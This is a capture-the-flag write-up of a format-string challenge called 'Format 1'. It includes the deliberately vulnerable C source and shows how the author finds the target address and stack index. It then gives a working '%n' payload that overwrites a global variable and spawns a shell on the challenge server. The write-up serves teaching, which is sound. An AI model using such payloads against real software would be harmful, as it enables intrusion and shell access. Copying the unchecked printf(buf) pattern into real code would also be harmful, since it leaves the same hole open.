### Solved by z0rex

"Format 1" was a binary challenge worth 100 points.

> This program is vulnerable to a format string attack! Try supplying a format 
> string to overwrite a global variable and get a shell! You can exploit the
> binary on our shell server at /problems/format1/. Download the binary here, 
> and source code is available here

We're given the source code, so let's have a peak.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int secret = 0;

void give_shell()
{
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system("/bin/sh -i");
}

int main(int argc, char **argv)
{
    char buf[128];
    memset(buf, 0, sizeof(buf));
    fgets(buf, 128, stdin);
    printf(buf);

    if (secret == 192)
    {
        give_shell();
    }
    else
    {
        printf("Sorry, secret = %d\n", secret);
    }

    return 0;
}
```

From this, it's easy to see what we need to do to trigger the `give_shell()`
function. We need to change the value of `secret` from 0 to 192.

```c
int secret = 0
.
.
.
if (secret == 192)
{
    give_shell();
}
```

Next I ran the binary normally just to see its behavior.

```
# ./format1 
123
123
Sorry, secret = 0
```

With basic format strings, modifying values stored in an address is a fairly
trivial task. All you need to know is the index of your buffer, the address to
write to and what to write.

I started off by using `objdump` to get the address of `secret`.

```
# objdump -t format1 | grep secret
0804a040 g     O .bss   00000004              secret
```

Then I moved on to find the correct index.

```
# python2 -c 'print "A"*4 + "-%x-%x-%x-%x-%x-%x-%x"' | ./format1 
AAAA-80-f7785580-ffb064f4-ffb063fe-1-c2-41414141
Sorry, secret = 0
```

Here we can see that the string AAAA (41414141) repeats at index 7. 

This is all I need to write a simple exploit, which looks like this
`"\x40\xa0\x04\x08%188x%7$n"`.

The first four bytes `\x40\xa0\x04\x08` is the address of `secret` reversed so
it matches little endian.

The last part `%188x%7$n` writes 4+188 bytes to whatever is on index 7, which in
our case now is the address of secret.

```
# python2 -c 'print "\x40\xa0\x04\x08%188x%7$n"' | ./format1 
@�                                                                                                                                                                                          80
sh-4.3# exit
```

Running it locally exited right away. So I tried on the challenge server

```
team24254@shell:/problems/format1$ (python2 -c 'print "\x40\xa0\x04\x08%188x%7$n"';cat) | ./format1
@�                                                                                                                                                                                          80
$
```

Success. It's not exiting. Let's get our flag.

```
cat flag.txt

[2]+  Stopped                 ( python2 -c 'print "\x40\xa0\x04\x08%188x%7$n"'; cat ) | ./format1
team24254@shell:/problems/format1$ is_%n_used_for_anything_besides_this
```

Flag: `is_%n_used_for_anything_besides_this`